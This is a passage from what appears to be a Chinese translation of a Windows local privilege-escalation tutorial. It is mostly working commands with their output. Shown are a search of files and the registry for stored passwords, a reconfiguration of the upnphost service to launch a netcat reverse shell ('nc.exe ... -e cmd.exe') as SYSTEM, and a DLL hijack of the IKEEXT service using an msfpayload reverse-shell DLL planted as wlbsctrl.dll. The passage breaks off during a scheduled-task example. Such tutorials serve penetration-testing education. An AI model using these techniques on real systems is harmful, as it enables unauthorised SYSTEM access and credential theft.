<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># The command below will search the file system for file names containing certain keywords. You can</span><br><span class="line">specify as many keywords as you wish.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; dir /s *pass* == *cred* == *vnc* == *.config*</span><br><span class="line"></span><br><span class="line"># Search certain file types for a keyword, this can generate a lot of output.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; findstr /si password *.xml *.ini *.txt</span><br><span class="line"></span><br><span class="line"># Similarly the two commands below can be used to grep the registry for keywords, in this case &quot;password&quot;.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; reg query HKLM /f password /t REG_SZ /s</span><br><span class="line">C:\Windows\system32&gt; reg query HKCU /f password /t REG_SZ /s</span><br></pre></td></tr></table></figure>
<h2 id="Δt-for-t7-to-t10-卷起你的袖子"><a href="#Δt-for-t7-to-t10-卷起你的袖子" class="headerlink" title="Δt for t7 to t10 - 卷起你的袖子"></a>Δt for t7 to t10 - 卷起你的袖子</h2><p>  希望到现在为止我们已经拥有了一个SYSTEM shell，但如果我们不这样做，那么仍有一些攻击途径需要仔细阅读。在最后一部分中，我们将介绍Windows服务和文件/文件夹权限。我们的目标是使用弱权限来提升会话权限。</p>
<p>我们将检查大量访问权限，因此我们应该获取accesschk.exe的副本，这是Microsoft的Sysinternals Suite中的一个工具。Microsoft Sysinternals包含许多优秀的工具，很遗憾微软没有将它们添加到标准的Windows版本中。您可以在<a href="http://technet.microsoft.com/en-us/sysinternals/bb842062.aspx" target="_blank" rel="noopener">此处</a>从Microsoft technet下载该套件。</p>
<p>我们将从Windows服务开始，因为那里有一些快速的胜利。通常，现代操作系统不包含易受攻击的服务。在这种情况下，易受攻击意味着我们可以重新配置服务参数。Windows服务有点像应用程序快捷方式，请看下面的例子  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># We can use sc to query, configure and manage windows services.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; sc qc Spooler</span><br><span class="line"></span><br><span class="line">[SC] QueryServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: Spooler</span><br><span class="line">        TYPE               : 110  WIN32_OWN_PROCESS (interactive)</span><br><span class="line">        START_TYPE         : 2   AUTO_START</span><br><span class="line">        ERROR_CONTROL      : 1   NORMAL</span><br><span class="line">        BINARY_PATH_NAME   : C:\Windows\System32\spoolsv.exe</span><br><span class="line">        LOAD_ORDER_GROUP   : SpoolerGroup</span><br><span class="line">        TAG                : 0</span><br><span class="line">        DISPLAY_NAME       : Print Spooler</span><br><span class="line">        DEPENDENCIES       : RPCSS</span><br><span class="line">                           : http</span><br><span class="line">        SERVICE_START_NAME : LocalSystem</span><br></pre></td></tr></table></figure>
<p>我们可以使用accesschk检查每个服务所需的权限级别。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># We can see the permissions that each user level has, you can also use &quot;accesschk.exe -ucqv *&quot; to list</span><br><span class="line">all services.</span><br><span class="line"></span><br><span class="line">C:\&gt; accesschk.exe -ucqv Spooler</span><br><span class="line"></span><br><span class="line">Spooler</span><br><span class="line"></span><br><span class="line">  R  NT AUTHORITY\Authenticated Users</span><br><span class="line">        SERVICE_QUERY_STATUS</span><br><span class="line">        SERVICE_QUERY_CONFIG</span><br><span class="line">        SERVICE_INTERROGATE</span><br><span class="line">        SERVICE_ENUMERATE_DEPENDENTS</span><br><span class="line">        SERVICE_USER_DEFINED_CONTROL</span><br><span class="line">        READ_CONTROL</span><br><span class="line">  R  BUILTIN\Power Users</span><br><span class="line">        SERVICE_QUERY_STATUS</span><br><span class="line">        SERVICE_QUERY_CONFIG</span><br><span class="line">        SERVICE_INTERROGATE</span><br><span class="line">        SERVICE_ENUMERATE_DEPENDENTS</span><br><span class="line">        SERVICE_START</span><br><span class="line">        SERVICE_USER_DEFINED_CONTROL</span><br><span class="line">        READ_CONTROL</span><br><span class="line">  RW BUILTIN\Administrators</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">  RW NT AUTHORITY\SYSTEM</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br></pre></td></tr></table></figure>
<p>   Accesschk可以自动检查我们是否具有对具有特定用户级别的Windows服务的写访问权。通常作为低权限用户，我们将要检查“Authenticated Users”。确保检查您的用户所属的用户组，例如“Power Users”被视为低权限用户组（尽管它没有被广泛使用）。</p>
<p>让我们比较Windows 8和Windows XP SP0上的输出。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"># This is on Windows 8.</span><br><span class="line"></span><br><span class="line">C:\Users\b33f\tools\Sysinternals&gt; accesschk.exe -uwcqv &quot;Authenticated Users&quot; *</span><br><span class="line">No matching objects found.</span><br><span class="line"></span><br><span class="line"># On a default Windows XP SP0 we can see there is a pretty big security fail.</span><br><span class="line"></span><br><span class="line">C:\&gt; accesschk.exe -uwcqv &quot;Authenticated Users&quot; *</span><br><span class="line">RW SSDPSRV</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">RW upnphost</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">		</span><br><span class="line">C:\&gt; accesschk.exe -ucqv SSDPSRV</span><br><span class="line"></span><br><span class="line">SSDPSRV</span><br><span class="line"></span><br><span class="line">  RW NT AUTHORITY\SYSTEM</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">  RW BUILTIN\Administrators</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">  RW NT AUTHORITY\Authenticated Users</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">  RW BUILTIN\Power Users</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">  RW NT AUTHORITY\LOCAL SERVICE</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line"></span><br><span class="line">C:\&gt; accesschk.exe -ucqv upnphost</span><br><span class="line"></span><br><span class="line">upnphost</span><br><span class="line"></span><br><span class="line">  RW NT AUTHORITY\SYSTEM</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">  RW BUILTIN\Administrators</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">  RW NT AUTHORITY\Authenticated Users</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">  RW BUILTIN\Power Users</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">  RW NT AUTHORITY\LOCAL SERVICE</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br></pre></td></tr></table></figure>
<p>  此问题后来通过引入XP SP2解决，但是在SP0和SP1上，它可以用作通用本地权限提升漏洞。通过重新配置服务，我们可以让它以SYSTEM级别权限运行我们选择的任何二进制文件。</p>
<p>我们来看看这是如何在实践中完成的。在这种情况下，服务将执行netcat并打开具有SYSTEM级别权限的反向shell。其他选择当然是可能的。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; sc qc upnphost</span><br><span class="line"></span><br><span class="line">[SC] GetServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: upnphost</span><br><span class="line">        TYPE               : 20  WIN32_SHARE_PROCESS</span><br><span class="line">        START_TYPE         : 3   DEMAND_START</span><br><span class="line">        ERROR_CONTROL      : 1   NORMAL</span><br><span class="line">        BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService</span><br><span class="line">        LOAD_ORDER_GROUP   :</span><br><span class="line">        TAG                : 0</span><br><span class="line">        DISPLAY_NAME       : Universal Plug and Play Device Host</span><br><span class="line">        DEPENDENCIES       : SSDPSRV</span><br><span class="line">        SERVICE_START_NAME : NT AUTHORITY\LocalService</span><br><span class="line">		</span><br><span class="line">C:\&gt; sc config upnphost binpath= &quot;C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe&quot;</span><br><span class="line">[SC] ChangeServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">C:\&gt; sc config upnphost obj= &quot;.\LocalSystem&quot; password= &quot;&quot;</span><br><span class="line">[SC] ChangeServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">C:\&gt; sc qc upnphost</span><br><span class="line"></span><br><span class="line">[SC] GetServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: upnphost</span><br><span class="line">        TYPE               : 20  WIN32_SHARE_PROCESS</span><br><span class="line">        START_TYPE         : 3   DEMAND_START</span><br><span class="line">        ERROR_CONTROL      : 1   NORMAL</span><br><span class="line">        BINARY_PATH_NAME   : C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe</span><br><span class="line">        LOAD_ORDER_GROUP   :</span><br><span class="line">        TAG                : 0</span><br><span class="line">        DISPLAY_NAME       : Universal Plug and Play Device Host</span><br><span class="line">        DEPENDENCIES       : SSDPSRV</span><br><span class="line">        SERVICE_START_NAME : LocalSystem</span><br><span class="line">		</span><br><span class="line">C:\&gt; net start upnphost</span><br></pre></td></tr></table></figure>
<p><img src="http://www.fuzzysecurity.com/tutorials/images/priv01_big.png" alt="img"></p>
<p>Service Shell (upnphost)</p>
<p>即使配置不正确，我们也不会始终拥有对服务的完全访问权限。下图来自Brett Moore关于Windows权限升级的演示文稿，这些访问权限中的任何一个都将为我们提供一个SYSTEM shell。</p>
<p><img src="http://www.fuzzysecurity.com/tutorials/images/priv02_big.png" alt="img"></p>
<p>  需要记住的重要一点是，我们会发现我们的受感染会话所属的用户组。如前所述，“Power Users”也被视为低权限用户组。“Power Users”有各自的漏洞，Mark Russinovich写了一篇关于这个主题的非常有趣的文章。</p>
<p>Power in Power用户（Mark Russinovich） - <a href="http://blogs.technet.com/b/markrussinovich/archive/2006/05/01/the-power-in-power-users.aspx" target="_blank" rel="noopener">这里</a></p>
<p>最后我们将检查文件/文件夹权限，如果我们不能直接攻击操作系统，我们将让操作系统完成所有的工作。这里有很多内容，所以我将向您展示两种权限漏洞以及如何利用它们。一旦掌握了总体思路，您就可以将这些技术应用于其他情境。</p>
<p>对于我们的第一个例子，我们将复制Parvez从GreyHatHacker写的一篇文章的结果; “通过利用弱文件夹权限提升权限”。这是一个很好的特权升级写作，我强烈建议你<a href="http://www.greyhathacker.net/?p=738" target="_blank" rel="noopener">在这里</a>阅读他的帖子。</p>
<p>此示例是DLL劫持的特例。程序通常不能自己运行，它们需要很多资源（大多数是DLL，但也有专有文件）。如果程序或服务从我们具有写访问权限的目录加载文件，我们可以滥用它来弹出具有程序运行权限的shell。</p>
<p>通常，Windows应用程序将使用预定义的搜索路径来查找DLL，并且它将按特定顺序检查这些路径。DLL劫持通常是通过将恶意DLL放在其中一个路径中，同时确保在合法DLL之前找到DLL来实现的。通过让应用程序指定它所需的DLL的绝对路径，可以减轻此问题。</p>
<p>您可以在以下32位系统上看到DLL搜索顺序：<br>1 - 应用程序加载的目录<br>2 - 32位系统目录（C：\ Windows \ System32）<br>3 - 16位系统目录（C：\ Windows \ System）<br>4 - Windows目录（C：\ Windows）<br>5 - 当前工作目录（CWD）<br>6 - PATH环境变量中的目录（系统然后用户）</p>
<p>有时会发生应用程序尝试加载机器上不存在的DLL。这可能由于多种原因而发生，例如，如果仅对某些插件或未安装的功能需要DLL。在这种情况下，Parvez发现某些Windows服务尝试加载默认安装中不存在的DLL。</p>
<p>由于有问题的DLL不存在，我们将最终遍历所有搜索路径。作为一个低权限用户，我们没有希望将恶意DLL放入1-4中，在这种情况下不可能出现这种情况，因为我们讨论的是Windows服务但是如果我们对Windows PATH中的任何目录都有写访问权限我们赢了。</p>
<p>让我们看看它在实践中是如何工作的，对于我们的示例，我们将使用试图加载wlbsctrl.dll的IKEEXT（IKE和AuthIP IPsec Keying Modules）服务。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"># This is on Windows 7 as low privilege user1.</span><br><span class="line"></span><br><span class="line">C:\Users\user1\Desktop&gt; echo %username%</span><br><span class="line"></span><br><span class="line">user1</span><br><span class="line"></span><br><span class="line"># We have a win here since any non-default directory in &quot;C:\&quot; will give write access to authenticated</span><br><span class="line">users.</span><br><span class="line">		</span><br><span class="line">C:\Users\user1\Desktop&gt; echo %path%</span><br><span class="line"></span><br><span class="line">C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;</span><br><span class="line">C:\Program Files\OpenVPN\bin;C:\Python27</span><br><span class="line"></span><br><span class="line"># We can check our access permissions with accesschk or cacls.</span><br><span class="line"></span><br><span class="line">C:\Users\user1\Desktop&gt; accesschk.exe -dqv &quot;C:\Python27&quot;</span><br><span class="line"></span><br><span class="line">C:\Python27</span><br><span class="line">  Medium Mandatory Level (Default) [No-Write-Up]</span><br><span class="line">  RW BUILTIN\Administrators</span><br><span class="line">        FILE_ALL_ACCESS</span><br><span class="line">  RW NT AUTHORITY\SYSTEM</span><br><span class="line">        FILE_ALL_ACCESS</span><br><span class="line">  R  BUILTIN\Users</span><br><span class="line">        FILE_LIST_DIRECTORY</span><br><span class="line">        FILE_READ_ATTRIBUTES</span><br><span class="line">        FILE_READ_EA</span><br><span class="line">        FILE_TRAVERSE</span><br><span class="line">        SYNCHRONIZE</span><br><span class="line">        READ_CONTROL</span><br><span class="line">  RW NT AUTHORITY\Authenticated Users</span><br><span class="line">        FILE_ADD_FILE</span><br><span class="line">        FILE_ADD_SUBDIRECTORY</span><br><span class="line">        FILE_LIST_DIRECTORY</span><br><span class="line">        FILE_READ_ATTRIBUTES</span><br><span class="line">        FILE_READ_EA</span><br><span class="line">        FILE_TRAVERSE</span><br><span class="line">        FILE_WRITE_ATTRIBUTES</span><br><span class="line">        FILE_WRITE_EA</span><br><span class="line">        DELETE</span><br><span class="line">        SYNCHRONIZE</span><br><span class="line">        READ_CONTROL</span><br><span class="line"></span><br><span class="line">C:\Users\user1\Desktop&gt; cacls &quot;C:\Python27&quot;</span><br><span class="line"></span><br><span class="line">C:\Python27 BUILTIN\Administrators:(ID)F</span><br><span class="line">            BUILTIN\Administrators:(OI)(CI)(IO)(ID)F</span><br><span class="line">            NT AUTHORITY\SYSTEM:(ID)F</span><br><span class="line">            NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(ID)F</span><br><span class="line">            BUILTIN\Users:(OI)(CI)(ID)R</span><br><span class="line">            NT AUTHORITY\Authenticated Users:(ID)C</span><br><span class="line">            NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(ID)C</span><br><span class="line">			</span><br><span class="line"># Before we go over to action we need to check the status of the IKEEXT service. In this case we can see</span><br><span class="line">it is set to &quot;AUTO_START&quot; so it will launch on boot!</span><br><span class="line">		</span><br><span class="line">C:\Users\user1\Desktop&gt; sc qc IKEEXT</span><br><span class="line"></span><br><span class="line">[SC] QueryServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: IKEEXT</span><br><span class="line">        TYPE               : 20  WIN32_SHARE_PROCESS</span><br><span class="line">        START_TYPE         : 2   AUTO_START</span><br><span class="line">        ERROR_CONTROL      : 1   NORMAL</span><br><span class="line">        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k netsvcs</span><br><span class="line">        LOAD_ORDER_GROUP   :</span><br><span class="line">        TAG                : 0</span><br><span class="line">        DISPLAY_NAME       : IKE and AuthIP IPsec Keying Modules</span><br><span class="line">        DEPENDENCIES       : BFE</span><br><span class="line">        SERVICE_START_NAME : LocalSystem</span><br></pre></td></tr></table></figure>
<p>现在我们知道满足必要条件我们可以生成恶意DLL并弹出shell！</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">root@darkside:~# msfpayload windows/shell_reverse_tcp lhost=&apos;127.0.0.1&apos; lport=&apos;9988&apos; O</span><br><span class="line"></span><br><span class="line">       Name: Windows Command Shell, Reverse TCP Inline</span><br><span class="line">     Module: payload/windows/shell_reverse_tcp</span><br><span class="line">   Platform: Windows</span><br><span class="line">       Arch: x86</span><br><span class="line">Needs Admin: No</span><br><span class="line"> Total size: 314</span><br><span class="line">       Rank: Normal</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  vlad902 &lt;vlad902@gmail.com&gt;</span><br><span class="line">  sf &lt;stephen_fewer@harmonysecurity.com&gt;</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">Name      Current Setting  Required  Description</span><br><span class="line">----      ---------------  --------  -----------</span><br><span class="line">EXITFUNC  process          yes       Exit technique: seh, thread, process, none</span><br><span class="line">LHOST     127.0.0.1        yes       The listen address</span><br><span class="line">LPORT     9988             yes       The listen port</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  Connect back to attacker and spawn a command shell</span><br><span class="line"></span><br><span class="line">root@darkside:~# msfpayload windows/shell_reverse_tcp lhost=&apos;127.0.0.1&apos; lport=&apos;9988&apos; D &gt; </span><br><span class="line">/root/Desktop/evil.dll</span><br><span class="line"></span><br><span class="line">Created by msfpayload (http://www.metasploit.com).</span><br><span class="line">Payload: windows/shell_reverse_tcp</span><br><span class="line"> Length: 314</span><br><span class="line">Options: &#123;&quot;lhost&quot;=&gt;&quot;127.0.0.1&quot;, &quot;lport&quot;=&gt;&quot;9988&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>将DLL传输到目标机器后，我们需要做的就是将其重命名为wlbsctrl.dll并将其移动到“C:\Python27”。一旦完成，我们需要耐心地等待机器重新启动（或者我们可以尝试强制重启），我们将获得一个SYSTEM shell。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"># Again, this is as low privilege user1.</span><br><span class="line"></span><br><span class="line">C:\Users\user1\Desktop&gt; dir</span><br><span class="line"></span><br><span class="line"> Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is 948D-A98F</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\user1\Desktop</span><br><span class="line"></span><br><span class="line">02/18/2014  01:49 PM    &lt;DIR&gt;          .</span><br><span class="line">02/18/2014  01:49 PM    &lt;DIR&gt;          ..</span><br><span class="line">04/22/2013  09:39 AM           331,888 accesschk.exe</span><br><span class="line">02/18/2014  12:38 PM            14,336 evil.dll</span><br><span class="line">01/25/2014  12:46 AM            36,864 fubar.exe</span><br><span class="line">01/22/2014  08:17 AM    &lt;DIR&gt;          incognito2</span><br><span class="line">06/30/2011  01:52 PM         1,667,584 ncat.exe</span><br><span class="line">11/22/2013  07:39 PM             1,225 wmic_info.bat</span><br><span class="line">               5 File(s)      2,051,897 bytes</span><br><span class="line">               3 Dir(s)      73,052,160 bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\user1\Desktop&gt; copy evil.dll C:\Python27\wlbsctrl.dll</span><br><span class="line"></span><br><span class="line">        1 file(s) copied.</span><br><span class="line">		</span><br><span class="line">C:\Users\user1\Desktop&gt; dir C:\Python27</span><br><span class="line"></span><br><span class="line"> Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is 948D-A98F</span><br><span class="line"></span><br><span class="line"> Directory of C:\Python27</span><br><span class="line"></span><br><span class="line">02/18/2014  01:53 PM    &lt;DIR&gt;          .</span><br><span class="line">02/18/2014  01:53 PM    &lt;DIR&gt;          ..</span><br><span class="line">10/20/2012  02:52 AM    &lt;DIR&gt;          DLLs</span><br><span class="line">10/20/2012  02:52 AM    &lt;DIR&gt;          Doc</span><br><span class="line">10/20/2012  02:52 AM    &lt;DIR&gt;          include</span><br><span class="line">01/28/2014  03:45 AM    &lt;DIR&gt;          Lib</span><br><span class="line">10/20/2012  02:52 AM    &lt;DIR&gt;          libs</span><br><span class="line">04/10/2012  11:34 PM            40,092 LICENSE.txt</span><br><span class="line">04/10/2012  11:18 PM           310,875 NEWS.txt</span><br><span class="line">04/10/2012  11:31 PM            26,624 python.exe</span><br><span class="line">04/10/2012  11:31 PM            27,136 pythonw.exe</span><br><span class="line">04/10/2012  11:18 PM            54,973 README.txt</span><br><span class="line">10/20/2012  02:52 AM    &lt;DIR&gt;          tcl</span><br><span class="line">10/20/2012  02:52 AM    &lt;DIR&gt;          Tools</span><br><span class="line">04/10/2012  11:31 PM            49,664 w9xpopen.exe</span><br><span class="line">02/18/2014  12:38 PM            14,336 wlbsctrl.dll</span><br><span class="line">               7 File(s)        523,700 bytes</span><br><span class="line">               9 Dir(s)      73,035,776 bytes free</span><br></pre></td></tr></table></figure>
<p>一切都已设置，我们现在需要做的就是等待系统重启。出于演示目的，我在下面包含了一个屏幕截图，我使用管理员命令提示符手动重启服务。</p>
<p>[<img src="http://www.fuzzysecurity.com/tutorials/images/priv03_big.png" alt="img"></p>
<p>Service Shell (IKEEXT)</p>
<p>对于我们的最后一个例子，我们将查看计划的任务。回顾我们之前收集的结果，我们遇到了以下条目。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">HostName:                             B33F</span><br><span class="line">TaskName:                             \LogGrabberTFTP</span><br><span class="line">Next Run Time:                        2/19/2014 9:00:00 AM</span><br><span class="line">Status:                               Ready</span><br><span class="line">Logon Mode:                           Interactive/Background</span><br><span class="line">Last Run Time:                        N/A</span><br><span class="line">Last Result:                          1</span><br><span class="line">Author:                               B33F\b33f</span><br><span class="line">Task To Run:                          E:\GrabLogs\tftp.exe 10.1.1.99 GET log.out E:\GrabLogs\Logs\log.txt</span><br><span class="line">Start In:                             N/A</span><br><span class="line">Comment:                              N/A</span><br><span class="line">Scheduled Task State:                 Enabled</span><br><span class="line">Idle Time:                            Disabled</span><br><span class="line">Power Management:                     Stop On Battery Mode, No Start On Batteries</span><br><span class="line">Run As User:                          SYSTEM</span><br><span class="line">Delete Task If Not Rescheduled:       Enabled</span><br><span class="line">Stop Task If Runs X Hours and X Mins: 72:00:00</span><br><span class="line">Schedule:                             Scheduling data is not available in this format.</span><br><span class="line">Schedule Type:                        Daily</span><br><span class="line">Start Time:                           9:00:00 AM</span><br><span class="line">Start Date:                           2/17/2014</span><br><span class="line">End Date:                             N/A</span><br><span class="line">Days:                                 Every 1 day(s)</span><br><span class="line">Months:                               N/A</span><br><span class="line">Repeat: Every:                        Disabled</span><br><span class="line">Repeat: Until: Time:                  Disabled</span><br><span class="line">Repeat: Until: Duration:              Disabled</span><br><span class="line">Repeat: Stop If Still Running:        Disabled</span><br></pre></td></tr></table></figure>
<p>盒子上似乎有一个TFTP客户端连接到远程主机并抓取某种日志文件。我们可以看到此任务每天上午9点运行，并以SYSTEM级别权限（ouch）运行。让我们看看我们是否具有对此文件夹的写入权限。</p>
